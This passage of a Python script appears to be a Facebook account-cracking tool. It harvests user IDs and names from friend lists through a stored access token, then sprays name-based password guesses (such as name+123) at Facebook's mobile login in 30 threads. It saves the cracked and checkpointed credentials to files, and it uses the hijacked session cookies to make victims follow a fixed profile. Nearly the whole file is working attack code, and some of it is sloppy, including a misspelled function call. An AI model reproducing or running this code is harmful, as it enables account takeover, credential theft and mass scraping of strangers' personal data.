    print(' [E] exit ')
    print('')
    _sarfraz___ = input(' [?] Choose option : ')
    if _sarfraz___ in ('1', '01'):
        __xxx__().sarfrazx(id)
    if _sarfraz___ in ('2', '02'):
        create_file()
    if _sarfraz___ in ('E', 'ee'):
        pass


class __xxx__:
    def __init__(self):
        self.id = []
    def sarfrazx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.sarfrazx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[Soumik] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [SAS-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('SAS_OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s [SAS-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('SAS_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s [SAS-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('SAS_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('[1] Crack With Auto Pass ')
        print('[2] Crack With Name Digit Pass')
        chi = input('\n [?] Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
            print(47*"-")
            print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        else:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
            p1 = input('  Name + 1 : ')
            p2 = input('  Name + 2 : ')
            p3 = input('  Name + 3 : ')
            p4 = input('  Name + 4 : ')
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
            print(47*"-")
            print('\033[1;37m Total IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()

def create_file():
    os.system('clear')
    print(logo)
    print('  [1] Create file manual')
    print('  [2] Create file auto')
    print('  [B] Back to main menu')
    print(50*'-')
    cf = input('  Choose method: ')
    if cf =='1':
        manual()
    elif cf =='2':
        auto()
    elif cf =='3':
        likes()
    elif cf =='3' or cf =='b' or cf =='B':
        main()
    else:
        print('\n  Choose correct option ...')
        time.sleep(1)
        create_file()

def manual():
    try:
        token = open('/sdcard/tokenofl.txt', 'r').read()
    except FileNotFoundError:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+token).text
        q = json.loads(r)
        uname = q['name']
    except (KeyError):
        login()
    os.system('clear')
    print(logo)
    print('  Name: '+uname)
    print(50*'-')
    limit = int(input('  How many ids do you want to add ? '))
    save_file = input('  Save file as: ')
    t = 0
    for u in range(limit):
        t+=1
        try:
            ids = input('  Put id no%s: '%t)
            r = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+token).text
            q = json.loads(r)
            for j in q['data']:
                uids = j['id']
                names = j['name']
                first_name = names.split(' ')[0]
                try:
                    last_name = names.split(' ')[1]
                except:
                    last_name = 'Khan'
                with open('/sdcard/'+save_file, 'a') as rd:
                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')
        except KeyError:
            print('  No friend for '+ids)
            pass
    print(50*'-')
    print('  Ids saved as: '+save_file)
    print(50*'-')
    input(' Press enter to back')
    sarfraz()
    
def auto():
    os.system('rm -rf temp*')
    try:
        access_token = open('/sdcard/tokenofl.txt', 'r').read()
    except:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
    os.system('clear')
    print(logo)
    print('  Logged user: '+uname)
    print(50*'-')
    nusrat = []
    try:
        limit_user = int(input('  How many ids do you want to add ? '))
    except:
        limit_user = 1
    count = 0
    for fir in range(limit_user):
        count +=1
        udit = input('  Put id%s: '%(count))
        try:
            tfile = open('/sdcard/tokenofl.txt','r').read()
            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&access_token='+tfile).text
            qfr = json.loads(fr)
            temp_save = open('temp.txt', 'a')
            for data in qfr['data']:
                uids = data['id']
                if uids in nusrat:
                    pass
                else:
                    nusrat.append(uids)
                    temp_save.write(uids+'\n')
            temp_save.close()
        except KeyError:
            if 'invalid' in str(fr):
                print('  Logged token has expired ...')
                pass
            else:
                print('  No friends found for user: '+udit)
                pass
    os.system('clear')
    print(logo)
    print('   Total ids: '+str(len(nusrat)))
    print(50*'-')
    try:
        ask_link = int(input('  How many links do you want to grab? '))
    except:
        ask_link = 1
    completed = 0
    for links in range(ask_link):
        completed +=1
        li = input('  %s Link start with: '%completed)
        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
    save_file = input('  Save file as: ')
    os.system('clear')
    lines = open('temp2.txt', 'r').readlines()
    print(logo)
    print('  Total ids to grab: '+str(len(lines)))
    print('  Grabbing Process has started')
    print(50*'-')
    fileid = 'temp2.txt'
    fileidopen = open(fileid, 'r').read().splitlines()
    dill = []
    for ids in fileidopen:
        try:
            tfile = open('/sdcard/tokenofl.txt','r').read()
            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+tfile).text
            rgq = json.loads(rg)
            idsave=open('/sdcard/'+save_file, 'a')
            for inayat in rgq['data']:
                uids = inayat['id']
                dill.append(uids)
                nm = inayat['name']
                first_name = nm.split(' ')[0]
                try:
                    last_name = nm.split(' ')[1]
                except:
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+'|'+last_name+'\n')
            print('  Grabbed from: '+ids)
           # print('  Total friends: '+str(len(uids)))
            print('  Token status: Live')
            print(50*'-')
            idsave.close()
        except Exception as e:
            #print(e)
            if 'invalid' in str(rg):
                print('  Token has expired, try again ...')
                os.system('rm -rf temp*')
                pass
            else:
                print('  Grabbed from: '+ids)
                print('  Friendlist ids: 0')
                print('  Token status: Live')
                print(50*'-')
                os.system('rm -rf temp*')
                pass
    lenid = open('/sdcard/'+save_file, 'r').readlines()
    print('  Grabbing Process has completed ')
    os.system('rm -rf temp*')
    print('  Total ids grabbed: '+str(len(lenid)))
    print('  File saved as: /sdcard/'+save_file)
    print(50*'-')
    input('  Press enter to back ')
    safraz()
    
    
    
soumik()
